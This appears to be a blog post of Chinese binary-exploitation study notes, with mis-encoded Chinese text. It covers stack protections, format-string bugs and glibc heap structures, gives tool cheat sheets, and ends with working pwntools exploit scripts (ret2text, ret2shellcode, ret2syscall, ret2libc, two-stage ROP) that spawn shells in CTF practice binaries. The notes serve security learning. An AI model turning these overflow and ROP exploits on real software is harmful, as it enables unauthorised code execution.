<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o a a.c // GCC å¯èƒ½ä¼šè¯•å›¾è‡ªåŠ¨æ’å…¥è¿™ç§æº¢å‡ºæ£€æµ‹å€¼</span><br><span class="line">gcc -fno-stack-protector -o a a.c //ç¦ç”¨æ ˆä¿æŠ¤</span><br><span class="line">gcc -fstack-protector -o a a.c //å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰ char æ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç </span><br><span class="line">gcc -fstack-protector-all -o a a.c //å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç </span><br></pre></td></tr></table></figure>
<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>ä½ç½®æ— å…³ä»£ç ï¼Œè´Ÿè´£ä»£ç æ®µå’Œæ•°æ®æ®µbss</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c // é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸å¼€å¯PIE</span><br><span class="line">gcc -fpie -pie -o <span class="built_in">test</span> test.c // å¼€å¯PIEï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1</span><br><span class="line">gcc -fPIE -pie -o <span class="built_in">test</span> test.c // å¼€å¯PIEï¼Œæ­¤æ—¶ä¸ºæœ€é«˜å¼ºåº¦2</span><br><span class="line">gcc -fpic -o <span class="built_in">test</span> test.c // å¼€å¯PICï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1ï¼Œä¸ä¼šå¼€å¯PIE</span><br><span class="line">gcc -fPIC -o <span class="built_in">test</span> test.c // å¼€å¯PICï¼Œæ­¤æ—¶ä¸ºæœ€é«˜å¼ºåº¦2ï¼Œä¸ä¼šå¼€å¯PIE</span><br></pre></td></tr></table></figure>
<h1 id="æ ˆè¿ç§»"><a href="#æ ˆè¿ç§»" class="headerlink" title="æ ˆè¿ç§»"></a>æ ˆè¿ç§»</h1><p>æ§åˆ¶ESP</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117163123759.png" alt="image-20201117163123759"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165305864.png" alt="image-20201117165305864"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165321403.png" alt="image-20201117165321403"></p>
<h1 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h1><p><strong>å‰æï¼šæœ‰printf ä¸”ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§</strong></p>
<ol>
<li>æ³„éœ²æ ˆå†…å­˜</li>
<li>æ³„éœ²ä»»æ„åœ°å€å†…å­˜</li>
<li>ç¯¡æ”¹æ ˆå†…å­˜</li>
<li>ç¯¡æ”¹ä»»æ„åœ°å€å†…å­˜</li>
</ol>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117203103431.png" alt="image-20201117203103431"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%x</span><br><span class="line">%p æ‰“å°æ ˆä¸Šå†…å®¹</span><br><span class="line">%s æ‰“å°æ ˆä¸Šè§£æåœ°å€çš„å†…å®¹</span><br><span class="line">%n å†™å†…å®¹(æ‰“å°å­—èŠ‚çš„ä¸ªæ•°)</span><br><span class="line">printf(&quot;%d%d%d&quot;,a,b,c)</span><br><span class="line">printf(&quot;%3$d&quot;,a,b,c) æ§åˆ¶ç¬¬ä¸‰ä¸ªå‚æ•°</span><br><span class="line"></span><br><span class="line">printf(&quot;%20c&quot;,c)</span><br><span class="line">printf(&quot;aaa%n&quot;,c)</span><br><span class="line">printf(&quot;%7$n&quot;)</span><br><span class="line"></span><br><span class="line">%n 0x00000004</span><br><span class="line">%hn 0x0004</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117213226675.png" alt="image-20201117213226675"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118152914484.png" alt="image-20201118152914484"></p>
<h1 id="å †"><a href="#å †" class="headerlink" title="å †"></a>å †</h1><h2 id="ä»€ä¹ˆæ˜¯å †"><a href="#ä»€ä¹ˆæ˜¯å †" class="headerlink" title="ä»€ä¹ˆæ˜¯å †"></a>ä»€ä¹ˆæ˜¯å †</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118173315748.png" alt="image-20201118173315748"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118223608385.png" alt="image-20201118223608385"></p>
<h2 id="å †ç®¡ç†å™¨"><a href="#å †ç®¡ç†å™¨" class="headerlink" title="å †ç®¡ç†å™¨"></a>å †ç®¡ç†å™¨</h2><ul>
<li>é€»è¾‘é“¾è¡¨ï¼šæŒ‡é’ˆè¿èµ·æ¥,æŠŠåŒç±»çš„<code>chunk</code>è¿èµ·æ¥</li>
<li>ç‰©ç†é“¾è¡¨ï¼šé€šè¿‡<code>size</code>åŸŸç»„ç»‡ç›¸é‚»<code>chunk</code>ä¹‹é—´çš„å…³ç³»ï¼Œåˆ¤æ–­ç›¸é‚»æ˜¯å¦ä¸º<code>free chunk</code>ï¼Œè‹¥æ˜¯ï¼Œåˆ™åˆå¹¶</li>
</ul>
<h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a><strong>arena</strong></h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118224006678.png" alt="image-20201118224006678"></p>
<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a><strong>chunk</strong></h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118230656646.png" alt="image-20201118230656646"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110607276.png" alt="image-20201119110607276"></p>
<h4 id="malloced-chunk"><a href="#malloced-chunk" class="headerlink" title="malloced chunk"></a><strong>malloced chunk</strong></h4><p><strong>chunk</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118233221511.png" alt="image-20201118233221511"></p>
<p><code>pre size</code>:è®°å½•ä¸Šä¸€ä¸ªfree chunkçš„å¤§å°ï¼Œè‹¥ä¸Šä¸€ä¸ªchunkåœ¨ç”¨ï¼Œåˆ™<code>pre size</code>å°†è¢«åˆå¹¶</p>
<p><code>size</code>:æ•´ä¸ªchunk çš„å¤§å°</p>
<p><strong>top chunk</strong></p>
<p>ä»æ“ä½œç³»ç»Ÿæ‰¹å‘çš„ä¸åˆ†ç»™ç”¨æˆ·çš„chunk</p>
<h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a><strong>free chunk</strong></h4><p>small bin chunk</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119105945419.png" alt="image-20201119105945419"></p>
<p>large bin chunk</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110352335.png" alt="image-20201119110352335"></p>
<p>fast bin chunk</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110501531.png" alt="image-20201119110501531"></p>
<p><strong>pre size å¤ç”¨</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119114224011.png" alt="image-20201119114224011"></p>
<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a><strong>bin</strong></h3><p>åˆ†é…æ–¹å¼ï¼š<code>fastbin</code> â€”&gt;<code>unsorted bin</code>â€”&gt;<code>small bin</code>/<code>large bin</code> </p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162311702.png" alt="image-20201119162311702"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115539452.png" alt="image-20201119115539452"></p>
<h4 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h4><h4 id="fastbins"><a href="#fastbins" class="headerlink" title="fastbins"></a><strong>fastbins</strong></h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162151833.png" alt="image-20201119162151833"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163702351.png" alt="image-20201119163702351"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119120748019.png" alt="image-20201119120748019"></p>
<p><strong>binçš„åŒå‘é“¾è¡¨</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p>
<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a><strong>unsorted bin</strong></h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163039733.png" alt="image-20201119163039733"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163232880.png" alt="image-20201119163232880"></p>
<h4 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a><strong>small bins</strong></h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163209378.png" alt="image-20201119163209378"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163319068.png" alt="image-20201119163319068"></p>
<h4 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163433718.png" alt="image-20201119163433718"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163457182.png" alt="image-20201119163457182"></p>
<p><strong>å®ä¾‹</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115142092.png" alt="image-20201119115142092"></p>
<h1 id="å †æ¼æ´"><a href="#å †æ¼æ´" class="headerlink" title="å †æ¼æ´"></a>å †æ¼æ´</h1><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163935171.png" alt="image-20201119163935171"></p>
<p><strong>fastbin</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201121183321818.png" alt="image-20201121183321818"></p>
<p><strong>unsorted bin</strong></p>
<h1 id="å·¥å…·å­¦ä¹ "><a href="#å·¥å…·å­¦ä¹ " class="headerlink" title="å·¥å…·å­¦ä¹ "></a>å·¥å…·å­¦ä¹ </h1><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Import pwntools</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#Local communication</span></span><br><span class="line">io = process(<span class="string">"./a.out"</span>)</span><br><span class="line"><span class="comment">#Telecommunication</span></span><br><span class="line">io = remote(<span class="string">"ip"</span>,port)</span><br><span class="line"><span class="comment">#Receive message</span></span><br><span class="line">io.recvline()</span><br><span class="line">io.recvuntil(<span class="string">b":"</span>)</span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>,drop = <span class="literal">True</span>)</span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">#Send message</span></span><br><span class="line">io.sendline(<span class="string">b"abc"</span>)</span><br><span class="line">io.send(p32(<span class="number">0</span>)+<span class="string">b"\x0a"</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,str)</span><br><span class="line"><span class="comment">#Interactive</span></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#shellcode</span></span><br><span class="line">shellcraft.sh()  <span class="comment">#in sh environment</span></span><br><span class="line">shellcraft.amd64.sh() <span class="comment">#64 bit</span></span><br><span class="line">asm(shellcraft.sh()) <span class="comment">#machine code</span></span><br><span class="line">asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b'a'</span>) <span class="comment">#if the length is less than 112,then it will be supplemented whith a. </span></span><br><span class="line"><span class="comment">#if you want to attack the 64 bit,pls add it</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"><span class="comment">#find strings</span></span><br><span class="line">elf = ELF(<span class="string">"./filename"</span>)</span><br><span class="line">hex(next(elf.search(<span class="string">b"/bin/sh"</span>)))</span><br><span class="line"><span class="comment">#elf file</span></span><br><span class="line">elf = ELF(<span class="string">"./file"</span>)</span><br><span class="line">hex(elf.got[<span class="string">"puts"</span>])</span><br><span class="line">hex(elf.plt[<span class="string">"system"</span>])</span><br><span class="line">hex(elf.symbols[<span class="string">"buf2"</span>])</span><br><span class="line"><span class="comment">#flat</span></span><br><span class="line">flat([<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line"><span class="comment">#generate data</span></span><br><span class="line">cyclic(<span class="number">60</span>)</span><br><span class="line"><span class="comment">#byte data</span></span><br><span class="line">p32(<span class="number">1234</span>)</span><br><span class="line">\xd2\x04\x00\x00</span><br><span class="line">u32(<span class="string">"\xd2\x04\x00\x00"</span>)</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#start</span></span><br><span class="line">gdb file</span><br><span class="line">start</span><br><span class="line"><span class="comment">#run the executable</span></span><br><span class="line">run</span><br><span class="line"><span class="comment">#backtrace</span></span><br><span class="line">backtrace</span><br><span class="line"><span class="comment">#return</span></span><br><span class="line"><span class="built_in">return</span></span><br><span class="line"><span class="comment">#breakpoint</span></span><br><span class="line">b main</span><br><span class="line">b <span class="keyword">function</span></span><br><span class="line">b *0x</span><br><span class="line"><span class="comment">#information for breakpoint</span></span><br><span class="line">info b</span><br><span class="line"><span class="comment">#delete the breakpoint</span></span><br><span class="line">d num</span><br><span class="line"><span class="comment">#run</span></span><br><span class="line">r </span><br><span class="line"><span class="comment">#next step over</span></span><br><span class="line">n </span><br><span class="line"><span class="comment">#step in </span></span><br><span class="line">s  </span><br><span class="line"><span class="comment">#stack</span></span><br><span class="line">stack size</span><br><span class="line">stack 24</span><br><span class="line"><span class="comment">#virtual memory map</span></span><br><span class="line"><span class="comment">#to look rwx segment</span></span><br><span class="line">vmmap</span><br><span class="line"><span class="comment">#plt </span></span><br><span class="line">plt</span><br><span class="line">x p</span><br><span class="line">x/20 p</span><br><span class="line"><span class="comment">#got</span></span><br><span class="line">got</span><br><span class="line"><span class="comment">#chunk</span></span><br><span class="line">fastbin</span><br><span class="line">heap</span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">b *<span class="variable">$rebase</span>(0x18540)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">attach pid</span><br><span class="line"><span class="built_in">return</span></span><br></pre></td></tr></table></figure>
<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">G  ç›´æ¥è·³è½¬åœ°å€</span><br><span class="line">shift+f12  æ‰“å¼€å­—ç¬¦ä¸²çª—å£</span><br><span class="line">shift+E  æå–å­—ç¬¦ä¸²</span><br><span class="line">n  é‡å‘½åå˜é‡</span><br></pre></td></tr></table></figure>
<h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary filename --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure>
<h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libcbase + one_gadget_address</span><br></pre></td></tr></table></figure>
<h1 id="ç»ƒä¹ é¢˜"><a href="#ç»ƒä¹ é¢˜" class="headerlink" title="ç»ƒä¹ é¢˜"></a>ç»ƒä¹ é¢˜</h1><p>éå¸¸ç®€å•ï¼Œé€‚åˆå…¥é—¨</p>
<h2 id="æ ˆæº¢å‡º"><a href="#æ ˆæº¢å‡º" class="headerlink" title="æ ˆæº¢å‡º"></a>æ ˆæº¢å‡º</h2><h3 id="ret2text-1"><a href="#ret2text-1" class="headerlink" title="ret2text"></a>ret2text</h3><p>ç›´æ¥æœ‰åé—¨å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æŠŠåƒåœ¾æ•°æ®å¡«æ»¡è¦†ç›–ebpï¼Œç„¶åè®©è¿”å›åœ°å€è¿”å›åé—¨å‡½æ•°çš„åœ°å€å°±è¡Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2text"</span>)</span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">20</span> + p32(<span class="number">0x8048522</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ret2shellcode-1"><a href="#ret2shellcode-1" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>è‡ªå·±å†™å…¥shellcode(bss)ï¼Œç„¶åæº¢å‡ºåœ°å€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2shellcode"</span>)</span><br><span class="line"></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b'a'</span>)</span><br><span class="line">payload = shellcode + p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>ROPgadget</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2syscall"</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x80bb196</span></span><br><span class="line">pop_edx = <span class="number">0x806eb90</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line">payload =flat([ <span class="string">b'A'</span>* <span class="number">112</span> , pop_eax , <span class="number">0xb</span> ,pop_edx, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x80be408</span> ,int_80])</span><br><span class="line"></span><br><span class="line">print(io.recv())</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201107232027030.png" alt="image-20201107232027030"></p>
<p>æ ˆæº¢å‡ºï¼Œæœ‰/bin/shå­—ç¬¦ä¸² system@plt æ„é€ </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">io = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">bin_sh = next(elf.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x70</span> + p32(system_plt) + <span class="string">b'BBBB'</span> + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><p>æ ˆæº¢å‡º æ— /bin/shå­—ç¬¦ä¸²ï¼Œä½†bssæ®µå¯å†™</p>
<p>ç¬¬ä¸€ç§</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112215451308.png" alt="image-20201112215451308"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">"gets"</span>]</span><br><span class="line">bss = <span class="number">0x804a080</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x70</span> + p32(gets_plt) + p32(system_plt) + p32(bss) + p32(bss)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b"/bin/sh\x00"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒç§</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113183137009.png" alt="image-20201113183137009"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">"gets"</span>]</span><br><span class="line">bss = <span class="number">0x804a080</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x804843d</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x70</span> + p32(gets_plt) + p32(pop_ebx_ret) + p32(bss) + p32(system_plt) + p32(pop_ebx_ret) + p32(bss)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b"/bin/bash\x00"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="retlibc3"><a href="#retlibc3" class="headerlink" title="retlibc3"></a>retlibc3</h3><p>æ ˆå˜é‡çš„ç»“æ„</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202023659.png" alt="image-20201113202023659"></p>
<p>æ ˆçš„ç»“æ„</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202640601.png" alt="image-20201113202640601"></p>
<p>æ³„éœ²libc</p>
<p>åº”è¯¥æ˜¯libcä¸åŒå¯¼è‡´æ‰“ä¸é€š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">put = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts = libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">system = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,str(put))</span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>)</span><br><span class="line">libcbase = int(io.recvuntil(<span class="string">b"\n"</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - puts</span><br><span class="line">payload = flat( cyclic(<span class="number">60</span>), libcbase + system , <span class="number">0xdeadbeef</span> ,next(elf.search(<span class="string">b"sh\x00"</span>)))</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn2-x64"><a href="#pwn2-x64" class="headerlink" title="pwn2_x64"></a>pwn2_x64</h3><p>æ ˆå›¾</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116200344612.png" alt="image-20201116200344612"></p>
<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><ol>
<li>é€šè¿‡libcæ³„éœ²ç³»ç»Ÿå‡½æ•°ï¼Œé¦–å…ˆè·å¾—åŸºåœ°å€å¯ä»¥é€šè¿‡ä»¥ä¸‹æ¥æ³„éœ²ï¼ˆ1ï¼‰é€šè¿‡ROPç³»ç»Ÿè°ƒç”¨ï¼ˆ2ï¼‰ç›´æ¥å‡½æ•°writeæ³„éœ²</li>
<li>æ— sh ï¼ˆ1ï¼‰ç¬¦å·æœ‰æ— sh  ï¼ˆ2ï¼‰é€šè¿‡ROPå°†/bin/shå†™å…¥ ï¼ˆ3ï¼‰libcä¸­/bin/sh</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./level3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line">vulfun_addr = <span class="number">0x0804844B</span>  </span><br><span class="line">write_plt = elf.symbols[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span>+<span class="number">4</span>) + p32(write_plt) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b"Input:\n"</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>)) <span class="comment">#Specify four bytes</span></span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">"system"</span>] + libc_base</span><br><span class="line">sh_addr = libc_base + next(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line"><span class="comment">#libc_write=libc.symbols['write']</span></span><br><span class="line"><span class="comment">#libc_system=libc.symbols['system']</span></span><br><span class="line"><span class="comment">#libc_sh=next(libc.search(b'/bin/sh'))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#system_addr=write_addr-libc_write+libc_system </span></span><br><span class="line"><span class="comment">#sh_addr=write_addr-libc_write+libc_sh</span></span><br><span class="line">payload2 = cyclic(<span class="number">0x88</span>+<span class="number">4</span>) + p32(system_addr) + <span class="string">b'A'</span>*<span class="number">4</span> + p32(sh_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn3-x64"><a href="#pwn3-x64" class="headerlink" title="pwn3_x64"></a>pwn3_x64</h3><p>ä¸¤æ¬¡ROP</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174620932.png" alt="image-20201117174620932"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174719721.png" alt="image-20201117174719721"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#context.log_level="debug" </span></span><br><span class="line">elf=ELF(<span class="string">"level3_x64"</span>) </span><br><span class="line">write_plt=elf.symbols[<span class="string">"write"</span>] </span><br><span class="line">write_got=elf.got[<span class="string">"write"</span>] </span><br><span class="line">vul_addr=elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">p = process(<span class="string">"./level3_x64"</span>)</span><br><span class="line"><span class="comment">#p=remote("47.116.107.8",9883) </span></span><br><span class="line">p.recvuntil(<span class="string">b"Input:\n"</span>) </span><br><span class="line">pop_rdi_addr=<span class="number">0x00000000004006b3</span>   <span class="comment">#0x00000000004006b3 : pop rdi ; ret</span></span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x00000000004006b1</span>      <span class="comment">#0x00000000004006b1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line">payload1 = cyclic(<span class="number">0x80</span>+<span class="number">8</span>) + p64(pop_rdi_addr) + p64(<span class="number">1</span>) + p64(pop_rsi_r15_addr) + p64(write_got) + p64(<span class="string">'deadbeef'</span>) + p64(write_plt) + p64(vul_addr) </span><br><span class="line">p.sendline(payload1) </span><br><span class="line">t=p.recv(<span class="number">8</span>)</span><br><span class="line">write_addr=u64(t[<span class="number">0</span>:<span class="number">8</span>]) </span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>) </span><br><span class="line">offset=write_addr-libc.symbols[<span class="string">"write"</span>] </span><br><span class="line">sys_addr=offset+libc.symbols[<span class="string">"system"</span>] </span><br><span class="line">bin_addr=offset+next(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">payload2 = cyclic(<span class="number">0x80</span>+<span class="number">8</span>) + p64(pop_rdi_addr) + p64(bin_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
